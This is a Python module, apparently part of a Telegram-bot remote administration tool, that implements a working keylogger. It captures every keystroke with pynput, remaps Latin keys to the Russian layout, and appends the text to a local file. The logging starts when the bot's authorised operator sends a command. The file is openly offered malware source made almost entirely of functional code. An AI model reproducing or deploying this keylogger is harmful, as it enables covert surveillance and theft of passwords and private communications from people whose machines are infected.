##  _________________________________________
##   |_______  authors: Eks1azy     _______|
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##    \_\_\_|______  Tusay1  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\
##   ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy      / /
##  |                                        / /
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/


from aiogram import types, F
import threading
from pynput import keyboard
from pynput.keyboard import Key
from aiogram.fsm.context import FSMContext
from aiogram.filters import Command

from config import ALLOWED_USER_ID

log_file_path = "Folder.txt"
MAX_LINE_LENGTH = 200

def key_logger_handlers(dp):
    LAT_TO_RUS_MAP = str.maketrans(
        "qwertyuiop[]asdfghjkl;'zxcvbnm,.`",
        "йцукенгшщзхъфывапролджэячсмитьбюё"
    )


    def translate_layout(text: str) -> str:
        return text.translate(LAT_TO_RUS_MAP)


    class KeyLogger:
        def __init__(self, log_path: str):
            self.log_file_path = log_path
            self.buffer_line = ""
            self.listener = None
            self.listener_thread = None
            self.listener_running = False

        def on_press(self, key):
            try:
                char = key.char
                if char is None:
                    if key == Key.space:
                        self.buffer_line += ' '
                    return
                self.buffer_line += char
            except AttributeError:
                if key == Key.enter:
                    self.flush_buffer()
                elif key == Key.backspace:
                    self.buffer_line = self.buffer_line[:-1]
                elif key == Key.space:
                    self.buffer_line += ' '

            if len(self.buffer_line) >= MAX_LINE_LENGTH:
                self.flush_buffer()

        def flush_buffer(self):
            if self.buffer_line:
                with open(self.log_file_path, "a", encoding="utf-8") as f:
                    f.write(self.buffer_line + "\n")
                self.buffer_line = ""

        def start(self):
            if self.listener_running:
                return  
            self.listener_running = True
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener_thread = threading.Thread(target=self.listener.start, daemon=True)
            self.listener_thread.start()


    keylogger = KeyLogger(log_file_path)


    @dp.message(F.text.casefold().startswith("key logger [new]"))
    @dp.message(Command("key_logger"))
    async def start_getting_path(message: types.Message, state: FSMContext):
        if message.from_user.id != ALLOWED_USER_ID:
            return

        if not keylogger.listener_running or (keylogger.listener_thread and not keylogger.listener_thread.is_alive()):
            keylogger.start()
            await message.answer("Кейлоггер запущен, root")
        else:
            await message.answer("Кейлоггер уже работает, root")